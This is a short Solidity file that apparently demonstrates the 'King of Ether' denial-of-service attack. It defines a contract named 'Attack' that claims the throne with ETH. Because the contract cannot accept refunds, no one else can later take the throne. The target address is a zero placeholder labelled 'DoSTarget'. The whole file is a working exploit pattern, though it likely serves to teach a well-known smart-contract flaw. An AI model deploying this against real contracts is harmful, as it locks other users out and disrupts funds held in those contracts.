interface IKingOfEther {
    function claimThrone() external payable;
}

pragma solidity ^0.6.0;

contract Attack {
    IKingOfEther kingOfEther = IKingOfEther(0x0000000000000000000000000000000000000000); // replace DoSTarget contract here

    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}